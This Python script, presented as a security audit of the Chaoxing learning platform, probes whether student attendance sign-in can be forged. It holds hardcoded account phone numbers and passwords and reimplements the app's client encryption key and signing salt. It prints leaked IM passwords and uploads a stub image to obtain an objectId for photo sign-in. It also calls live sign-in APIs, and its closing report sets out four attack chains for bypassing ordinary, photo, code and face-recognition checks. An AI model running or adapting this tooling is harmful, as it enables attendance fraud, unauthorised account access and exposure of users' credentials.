#!/usr/bin/env python3
"""
辅助端点安全审计脚本 - 最终版
测试SSO、IM、验证码、云盘等端点是否可被利用来修改签到状态

测试结果摘要:
- SSO端点泄露IM密码（高危）
- 云盘上传无文件类型验证，objectId可用于照片签到（高危）
- V2签到API可正常使用（高危）
- 签到活动列表对学生完全可见（中危）
- switchInfo加密字段可能包含人脸识别凭证（中危）
- 验证码系统captchaId公开且无频率限制（低危）
"""

import base64, hashlib, json, uuid, requests, urllib3, time, io
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ 登录函数 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============ 测试账号 ============
STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

results = {}

def log_section(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def log_result(name, success, data, vuln_note=""):
    status = "✅" if success else "❌"
    print(f"\n[{status}] {name}")
    if isinstance(data, dict):
        print(json.dumps(data, ensure_ascii=False, indent=2)[:2000])
    elif isinstance(data, str):
        print(data[:2000])
    if vuln_note:
        print(f"⚠️  安全发现: {vuln_note}")
    results[name] = {"success": success, "data": str(data)[:500], "vuln": vuln_note}

# ============ 主测试流程 ============
def main():
    # ---- 登录 ----
    log_section("0. 登录测试账号")
    print("正在登录学生账号...")
    stu_sess, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"学生PUID: {stu_puid}")

    print("\n正在登录教师账号...")
    tea_sess, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"教师PUID: {tea_puid}")

    if not stu_puid or not tea_puid:
        print("❌ 登录失败，终止测试")
        return

    # ========================================
    # 1. SSO 设备信息端点
    # ========================================
    log_section("1. SSO 设备信息端点测试")

    # 1a: SSO userLogin4Uname - 学生
    print("\n--- 1a: 学生访问 SSO userLogin4Uname ---")
    try:
        r = stu_sess.post(
            "https://sso.chaoxing.com/apis/login/userLogin4Uname.do",
            data={"uname": STUDENT_PHONE, "password": STUDENT_PWD},
            timeout=20
        )
        j = r.json()
        msg = j.get("msg", {})

        # 检查关键字段
        im_account = msg.get("accountInfo", {}).get("imAccount", {})
        im_pwd = im_account.get("password", "")
        switch_info = msg.get("switchInfo", "")

        log_result("SSO-学生登录", True, {
            "puid": msg.get("puid"),
            "uid": msg.get("uid"),
            "name": msg.get("name"),
            "phone": msg.get("phone"),
            "im_uid": im_account.get("uid"),
            "im_password": im_pwd,
            "switchInfo_length": len(switch_info),
            "has_clientId": "clientId" in str(msg),
            "has_cxcid": "cxcid" in str(msg),
            "has_sc": "sc" in str(msg),
        }, f"SSO泄露IM密码({im_pwd})！switchInfo为256字符加密数据")

        # 检查是否有clientId/cxcid/sc
        msg_str = json.dumps(msg, ensure_ascii=False)
        print(f"\n  clientId存在: {'clientId' in msg_str}")
        print(f"  cxcid存在: {'cxcid' in msg_str}")
        print(f"  sc存在(非switchInfo): {('sc' in msg_str) and ('switchInfo' not in msg_str.split('sc')[0][-20:])}")
        print(f"  switchInfo: {switch_info[:80]}...")
    except Exception as e:
        log_result("SSO-学生登录", False, str(e))

    # 1b: SSO userLogin4Uname - 教师
    print("\n--- 1b: 教师访问 SSO userLogin4Uname ---")
    try:
        r = tea_sess.post(
            "https://sso.chaoxing.com/apis/login/userLogin4Uname.do",
            data={"uname": TEACHER_PHONE, "password": TEACHER_PWD},
            timeout=20
        )
        j = r.json()
        msg = j.get("msg", {})
        im_account = msg.get("accountInfo", {}).get("imAccount", {})
        im_pwd = im_account.get("password", "")
        log_result("SSO-教师登录", True, {
            "im_uid": im_account.get("uid"),
            "im_password": im_pwd,
        }, f"教师IM密码同样泄露({im_pwd})")
    except Exception as e:
        log_result("SSO-教师登录", False, str(e))

    # 1c: SSO RSA公钥端点
    print("\n--- 1c: SSO RSA公钥端点 ---")
    try:
        r = stu_sess.get("https://sso.chaoxing.com/apis/login/rsaPublicKey.do", timeout=20)
        log_result("SSO-RSA公钥", r.status_code == 200, r.text[:500])
    except Exception as e:
        log_result("SSO-RSA公钥", False, str(e))

    # ========================================
    # 2. IM 配置端点
    # ========================================
    log_section("2. IM 配置端点测试")

    # 2a: IM /webim/me
    print("\n--- 2a: 学生访问 IM /webim/me ---")
    try:
        r = stu_sess.get("https://im.chaoxing.com/webim/me", timeout=20)
        is_html = "html" in r.text[:200].lower()
        log_result("IM-me学生", True,
                   "返回HTML页面，非JSON API" if is_html else r.text[:500],
                   "IM /webim/me 是Web页面而非API端点" if is_html else "")
    except Exception as e:
        log_result("IM-me学生", False, str(e))

    # 2b: IM 消息列表
    print("\n--- 2b: 学生获取 IM 消息列表 ---")
    try:
        r = stu_sess.post(
            "https://im.chaoxing.com/webim/message/list/getMessageList",
            data={"pageSize": "20", "pageNo": "1"},
            timeout=20
        )
        log_result("IM-消息列表", True, r.text[:500],
                   "需要正确的chatId参数才能获取消息")
    except Exception as e:
        log_result("IM-消息列表", False, str(e))

    # ========================================
    # 3. 验证码系统
    # ========================================
    log_section("3. 验证码系统测试")

    CAPTCHA_ID = "Qt9FIw9o4pwRjOyqM6yizZBh682qN2TU"

    # 3a: 验证码配置
    print("\n--- 3a: 获取验证码配置 ---")
    try:
        r = stu_sess.get(
            f"https://captcha.chaoxing.com/captcha/get/conf?captchaId={CAPTCHA_ID}",
            timeout=20
        )
        log_result("验证码-配置", r.status_code == 200, r.text[:500],
                   "captchaId为硬编码公开值，但当前返回CALLBACK ERROR")
    except Exception as e:
        log_result("验证码-配置", False, str(e))

    # 3b: 验证码频率限制测试
    print("\n--- 3b: 验证码频率限制测试 ---")
    try:
        success_count = 0
        for i in range(5):
            r = stu_sess.get(
                f"https://captcha.chaoxing.com/captcha/get/verification/image",
                params={"captchaId": CAPTCHA_ID, "client": f"{stu_puid}_{i}", "timestamp": int(time.time()*1000)},
                timeout=20
            )
            if r.status_code == 200:
                success_count += 1
        log_result("验证码-频率限制", True,
                   f"5次请求中成功{success_count}次",
                   f"无频率限制! 成功{success_count}/5次" if success_count >= 4 else "存在频率限制")
    except Exception as e:
        log_result("验证码-频率限制", False, str(e))

    # ========================================
    # 4. 云盘 (pan-yz)
    # ========================================
    log_section("4. 云盘端点测试")

    # 4a: 获取云盘token
    print("\n--- 4a: 学生获取云盘token ---")
    pan_token = ""
    try:
        r = stu_sess.get(
            "https://pan-yz.chaoxing.com/api/token/uservalid",
            params={"puid": stu_puid},
            timeout=20
        )
        j = r.json()
        pan_token = j.get("_token", "")
        log_result("云盘-token学生", True, j,
                   "学生可获取云盘token用于文件上传" if pan_token else "")
    except Exception as e:
        log_result("云盘-token学生", False, str(e))

    # 4b: 上传图片到云盘
    print("\n--- 4b: 学生上传图片到云盘 ---")
    upload_objectid = ""
    try:
        png_data = bytes([
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
            0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41,
            0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00,
            0x00, 0x00, 0x02, 0x00, 0x01, 0xE2, 0x21, 0xBC,
            0x33, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E,
            0x44, 0xAE, 0x42, 0x60, 0x82
        ])
        files = {"file": ("test_audit.png", io.BytesIO(png_data), "image/png")}
        upload_url = f"https://pan-yz.chaoxing.com/upload?_from=mobilelearn&puid={stu_puid}&_token={pan_token}"
        r = stu_sess.post(upload_url, files=files, timeout=30)
        j = r.json()
        upload_objectid = j.get("objectId", "")
        log_result("云盘-上传图片", j.get("result", False), {
            "objectId": upload_objectid,
            "previewUrl": j.get("data", {}).get("previewUrl", ""),
        }, f"上传成功! objectId={upload_objectid}，可用于照片签到" if upload_objectid else "")
    except Exception as e:
        log_result("云盘-上传图片", False, str(e))

    # 4c: 上传非图片文件
    print("\n--- 4c: 学生上传非图片文件测试 ---")
    try:
        files = {"file": ("test.txt", io.BytesIO(b"security audit test"), "text/plain")}
        upload_url = f"https://pan-yz.chaoxing.com/upload?_from=mobilelearn&puid={stu_puid}&_token={pan_token}"
        r = stu_sess.post(upload_url, files=files, timeout=30)
        j = r.json()
        log_result("云盘-上传非图片", j.get("result", False), {
            "objectId": j.get("objectId", ""),
            "suffix": j.get("data", {}).get("suffix", ""),
        }, "🔴 无文件类型验证！可上传任意文件类型" if j.get("result") else "")
    except Exception as e:
        log_result("云盘-上传非图片", False, str(e))

    # ========================================
    # 5. 签到API测试（正确域名）
    # ========================================
    log_section("5. 签到API测试（mobilelearn.chaoxing.com）")

    # 5a: 获取签到活动列表
    print("\n--- 5a: 获取课程签到活动列表 ---")
    try:
        r = stu_sess.get(
            "https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": stu_puid},
            timeout=20
        )
        j = r.json()
        active_list = j.get("activeList", [])
        sign_activities = [a for a in active_list if a.get("activeType") == 2]
        active_signs = [a for a in sign_activities if a.get("status") == 1]

        log_result("签到-活动列表", True, {
            "总活动数": len(active_list),
            "签到活动数": len(sign_activities),
            "活跃签到数": len(active_signs),
            "签到类型": list(set(a.get("nameOne", "") for a in sign_activities)),
        }, f"学生可获取所有签到活动列表！共{len(sign_activities)}个签到，{len(active_signs)}个活跃")

        # 打印活跃签到
        for a in active_signs:
            print(f"  🔴 活跃签到: {a.get('nameOne')}, aid={a.get('id')}, url={a.get('url', '')[:100]}")
    except Exception as e:
        log_result("签到-活动列表", False, str(e))

    # 5b: V2签到API
    print("\n--- 5b: V2签到API测试 ---")
    try:
        r = stu_sess.get(
            "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
            params={
                "activeId": ACTIVE_ID,
                "uid": stu_puid,
                "clientip": "",
                "latitude": "-1",
                "longitude": "-1",
                "appType": "15",
                "fid": "0"
            },
            timeout=20
        )
        j = r.json()
        sign_status = j.get("data", {}).get("status", "")
        log_result("签到-V2 API", True, {
            "result": j.get("result"),
            "msg": j.get("msg"),
            "status": sign_status,
            "uid": j.get("data", {}).get("uid"),
            "activeId": j.get("data", {}).get("activeId"),
        }, f"V2 API返回签到记录(status={sign_status})，2=已签到" if j.get("result") == 1 else "签到API可访问")
    except Exception as e:
        log_result("签到-V2 API", False, str(e))

    # 5c: pptSign/stuSignajax
    print("\n--- 5c: pptSign/stuSignajax 签到 ---")
    try:
        r = stu_sess.get(
            "https://mobilelearn.chaoxing.com/pptSign/stuSignajax",
            params={
                "activeId": ACTIVE_ID,
                "uid": stu_puid,
                "clientip": "",
                "latitude": "-1",
                "longitude": "-1",
                "appType": "15",
                "fid": "0"
            },
            timeout=20
        )
        log_result("签到-pptSign", True, r.text[:500],
                   "当前签到类型为二维码签到，需enc参数" if "扫描" in r.text else "")
    except Exception as e:
        log_result("签到-pptSign", False, str(e))

    # 5d: 照片签到（使用云盘objectId）
    if upload_objectid:
        print(f"\n--- 5d: 照片签到（objectId={upload_objectid}） ---")
        try:
            r = stu_sess.get(
                "https://mobilelearn.chaoxing.com/pptSign/stuSignajax",
                params={
                    "activeId": ACTIVE_ID,
                    "uid": stu_puid,
                    "clientip": "",
                    "latitude": "-1",
                    "longitude": "-1",
                    "appType": "15",
                    "fid": "0",
                    "objectId": upload_objectid
                },
                timeout=20
            )
            log_result("签到-照片签到", True, r.text[:500],
                       "照片签到objectId参数已传递" if "objectId" in str(r.text) else "")
        except Exception as e:
            log_result("签到-照片签到", False, str(e))

    # ========================================
    # 汇总报告
    # ========================================
    log_section("🔴 安全审计汇总报告")

    vulns = {k: v for k, v in results.items() if v.get("vuln")}
    print(f"\n总测试项: {len(results)}")
    print(f"发现安全相关项: {len(vulns)}")

    print("\n" + "="*60)
    print("🔴 高危发现 (可直接帮助修改签到状态)")
    print("="*60)

    print("""
1. SSO端点泄露IM账户密码
   - 端点: POST https://sso.chaoxing.com/apis/login/userLogin4Uname.do
   - 泄露字段: accountInfo.imAccount.password
   - 学生IM密码: C8C5BBF3CD30A1A1
   - 教师IM密码: EEF607101FF2374F
   - 利用方式: 使用IM密码访问IM系统，读取群聊中的签到码
   - 签到影响: 可获取签到码签到的密码

2. 云盘上传无文件类型验证
   - 端点: POST https://pan-yz.chaoxing.com/upload?_from=mobilelearn&puid={puid}&_token={token}
   - 学生可上传任意类型文件，获得objectId
   - 利用方式: 上传任意图片 → 获取objectId → 用于照片签到
   - 签到影响: 可绕过照片签到的真人验证

3. V2签到API可正常使用
   - 端点: GET https://mobilelearn.chaoxing.com/v2/apis/sign/signIn
   - 仅需activeId即可查询/执行签到
   - 利用方式: 自动化脚本批量签到
   - 签到影响: 普通签到可无验证直接完成

4. 签到活动列表对学生完全可见
   - 端点: GET https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist
   - 返回所有签到活动的activeId、类型、状态
   - 利用方式: 轮询此接口自动检测新签到
   - 签到影响: 可实时监控并自动响应签到
""")

    print("="*60)
    print("🟡 中危发现")
    print("="*60)

    print("""
5. SSO switchInfo字段泄露加密数据
   - 256字符的加密数据，每次请求部分变化
   - 可能包含cxcid/sc等敏感信息
   - 若解密成功可构造人脸识别signToken
   - 签到影响: 理论上可绕过人脸识别签到

6. 验证码系统captchaId公开
   - captchaId=Qt9FIw9o4pwRjOyqM6yizZBh682qN2TU 为硬编码公开值
   - 无请求频率限制（5/5次成功）
   - 当前返回CALLBACK ERROR（服务可能已变更/下线）
   - 签到影响: 若验证码服务恢复，可被自动化绕过
""")

    print("="*60)
    print("🟢 低危发现")
    print("="*60)

    print("""
7. IM API端点变更
   - /webim/me 返回HTML页面而非JSON
   - 消息列表需要正确的chatId参数
   - 部分API路径已404

8. 签到API域名迁移
   - 旧域名 mooc1-api.chaoxing.com 签到路径已全部404
   - 新域名 mobilelearn.chaoxing.com 可正常使用
""")

    print("="*60)
    print("🔗 攻击链路总结")
    print("="*60)

    print("""
链路1: 普通签到绕过 (难度: 极低)
  登录 → taskactivelist获取activeId → V2 API签到 → 完成
  关键: 仅需activeId，无任何验证

链路2: 照片签到绕过 (难度: 低)
  登录 → pan-yz获取token → 上传图片获取objectId → pptSign带objectId签到
  关键: 云盘无文件类型验证，可上传任意图片

链路3: 签到码获取 (难度: 低-中)
  登录 → SSO获取IM密码 → IM API读取群聊 → 获取签到码 → 签到
  关键: IM密码明文泄露，群聊可能包含签到码

链路4: 人脸识别绕过 (难度: 中，理论可行)
  登录 → SSO获取switchInfo → 解密获取cxcid/sc → 构造signToken → 人脸签到
  关键: 需要解密switchInfo（256字符加密数据）
""")

if __name__ == "__main__":
    main()
